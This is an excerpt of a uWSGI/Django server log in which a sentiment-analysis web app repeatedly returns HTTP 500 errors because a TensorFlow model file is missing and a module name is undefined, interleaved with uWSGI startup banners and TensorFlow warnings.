  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 7, in <module>
    from . import naverNlp
  File "./haniumapp/naverNlp.py", line 94, in <module>
    loaded_model = load_model('review_data.h5') #      
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/saving/save.py", line 189, in load_model
    loader_impl.parse_saved_model(filepath)
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/saved_model/loader_impl.py", line 114, in parse_saved_model
    constants.SAVED_MODEL_FILENAME_PB))
OSError: SavedModel file does not exist at: review_data.h5/{saved_model.pbtxt|saved_model.pb}
Mon Aug 24 08:20:28 2020 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 223.194.169.151) !!!
Mon Aug 24 08:20:28 2020 - uwsgi_response_write_body_do(): Broken pipe [core/writer.c line 341] during GET / (223.194.169.151)
OSError: write error
[pid: 11194|app: 0|req: 5/5] 223.194.169.151 () {50 vars in 873 bytes} [Mon Aug 24 08:20:05 2020] GET / => generated 32611 bytes in 22768 msecs (HTTP/1.1 500) 5 headers in 157 bytes (0 switches on core 0)
0 / 50000
10000 / 50000
20000 / 50000
30000 / 50000
40000 / 50000
2020-08-24 08:20:50.033782: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-24 08:20:50.035190: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-24 08:20:50.036576: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
Internal Server Error: /
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 7, in <module>
    from . import naverNlp
  File "./haniumapp/naverNlp.py", line 94, in <module>
    loaded_model = load_model('review_data.h5') #      
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/saving/save.py", line 189, in load_model
    loader_impl.parse_saved_model(filepath)
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/saved_model/loader_impl.py", line 114, in parse_saved_model
    constants.SAVED_MODEL_FILENAME_PB))
OSError: SavedModel file does not exist at: review_data.h5/{saved_model.pbtxt|saved_model.pb}
Mon Aug 24 08:20:53 2020 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 223.194.169.151) !!!
Mon Aug 24 08:20:53 2020 - uwsgi_response_write_body_do(): Broken pipe [core/writer.c line 341] during GET / (223.194.169.151)
OSError: write error
[pid: 11194|app: 0|req: 6/6] 223.194.169.151 () {50 vars in 873 bytes} [Mon Aug 24 08:20:28 2020] GET / => generated 32611 bytes in 24392 msecs (HTTP/1.1 500) 5 headers in 157 bytes (0 switches on core 0)
0 / 50000
10000 / 50000
20000 / 50000
30000 / 50000
40000 / 50000
2020-08-24 08:21:14.247086: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-24 08:21:14.248543: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-24 08:21:14.249910: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
Internal Server Error: /
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 7, in <module>
    from . import naverNlp
  File "./haniumapp/naverNlp.py", line 94, in <module>
    loaded_model = load_model('review_data.h5') #      
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/saving/save.py", line 189, in load_model
    loader_impl.parse_saved_model(filepath)
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/saved_model/loader_impl.py", line 114, in parse_saved_model
    constants.SAVED_MODEL_FILENAME_PB))
OSError: SavedModel file does not exist at: review_data.h5/{saved_model.pbtxt|saved_model.pb}
[pid: 11194|app: 0|req: 7/7] 223.194.169.151 () {48 vars in 848 bytes} [Mon Aug 24 08:20:53 2020] GET / => generated 158259 bytes in 24237 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
0 / 50000
10000 / 50000
20000 / 50000
30000 / 50000
40000 / 50000
2020-08-24 08:22:05.502210: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-24 08:22:05.503679: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-24 08:22:05.505062: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
Internal Server Error: /
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 7, in <module>
    from . import naverNlp
  File "./haniumapp/naverNlp.py", line 94, in <module>
    loaded_model = load_model('review_data.h5') #      
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/saving/save.py", line 189, in load_model
    loader_impl.parse_saved_model(filepath)
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/saved_model/loader_impl.py", line 114, in parse_saved_model
    constants.SAVED_MODEL_FILENAME_PB))
OSError: SavedModel file does not exist at: review_data.h5/{saved_model.pbtxt|saved_model.pb}
[pid: 11194|app: 0|req: 8/8] 223.194.169.151 () {52 vars in 904 bytes} [Mon Aug 24 08:21:46 2020] GET / => generated 158527 bytes in 22621 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
0 / 50000
10000 / 50000
20000 / 50000
30000 / 50000
40000 / 50000
2020-08-24 08:23:03.581348: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-24 08:23:03.582771: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-24 08:23:03.584189: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
Internal Server Error: /
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 7, in <module>
    from . import naverNlp
  File "./haniumapp/naverNlp.py", line 94, in <module>
    loaded_model = load_model('review_data.h5') #      
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/saving/save.py", line 189, in load_model
    loader_impl.parse_saved_model(filepath)
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/saved_model/loader_impl.py", line 114, in parse_saved_model
    constants.SAVED_MODEL_FILENAME_PB))
OSError: SavedModel file does not exist at: review_data.h5/{saved_model.pbtxt|saved_model.pb}
[pid: 11194|app: 0|req: 9/9] 223.194.169.151 () {48 vars in 848 bytes} [Mon Aug 24 08:22:44 2020] GET / => generated 158259 bytes in 22438 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
0 / 50000
10000 / 50000
20000 / 50000
30000 / 50000
40000 / 50000
*** Starting uWSGI 2.0.18 (64bit) on [Mon Aug 24 08:23:32 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1032-aws #34~18.04.2-Ubuntu SMP Fri Jul 24 10:06:28 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x55e09e8c4d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55e09e8c4d00 pid: 11277 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 11277, cores: 1)
2020-08-24 08:23:37.942280: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-08-24 08:23:37.942318: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.
0 / 50000
10000 / 50000
20000 / 50000
30000 / 50000
40000 / 50000
2020-08-24 08:24:00.919661: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-08-24 08:24:00.919692: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-08-24 08:24:00.919731: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-08-24 08:24:00.919956: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-08-24 08:24:00.944104: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199825000 Hz
2020-08-24 08:24:00.944492: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x55e0a2192c70 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-08-24 08:24:00.944511: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-08-24 08:24:01.245162: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-24 08:24:01.246603: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-24 08:24:01.248011: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
Internal Server Error: /
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 7, in <module>
    from . import naverNlp
  File "./haniumapp/naverNlp.py", line 94, in <module>
    loaded_model = load_model('review_data.h5') #      
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/saving/save.py", line 189, in load_model
    loader_impl.parse_saved_model(filepath)
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/saved_model/loader_impl.py", line 114, in parse_saved_model
    constants.SAVED_MODEL_FILENAME_PB))
OSError: SavedModel file does not exist at: review_data.h5/{saved_model.pbtxt|saved_model.pb}
[pid: 11277|app: 0|req: 1/1] 223.194.169.151 () {52 vars in 904 bytes} [Mon Aug 24 08:23:37 2020] GET / => generated 158527 bytes in 27059 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
Gracefully killing worker 1 (pid: 11277)...
corrupted double-linked list
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 04:37:41 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x5626ffe73cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x5626ffe73cf0 pid: 3793 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 3793, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 115, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 113, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/usr/local/lib/python3.6/dist-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
    return view_func(*args, **kwargs)
  File "./haniumapp/views.py", line 40, in webhook
    return welcome()
  File "./haniumapp/views.py", line 47, in welcome
    text,score = naverNlp.predict_pos_text('3D     ..  3D     ??')
NameError: name 'naverNlp' is not defined
[pid: 3793|app: 0|req: 1/1] 66.102.6.201 () {42 vars in 540 bytes} [Thu Aug 27 04:37:46 2020] POST /webhook/ => generated 66462 bytes in 62 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 04:40:03 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x5631a47f0cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x5631a47f0cf0 pid: 3805 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 3805, cores: 1)
2020-08-27 04:40:12.310615: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-08-27 04:40:12.310650: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.
0 / 50000
10000 / 50000
20000 / 50000
30000 / 50000
40000 / 50000
2020-08-27 04:40:43.612907: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-08-27 04:40:43.612937: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-08-27 04:40:43.612954: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-08-27 04:40:43.613174: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-08-27 04:40:43.661432: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199915000 Hz
2020-08-27 04:40:43.661933: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x5631a80bf9d0 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-08-27 04:40:43.661951: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-08-27 04:40:44.084075: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-27 04:40:44.085559: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-27 04:40:44.086932: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
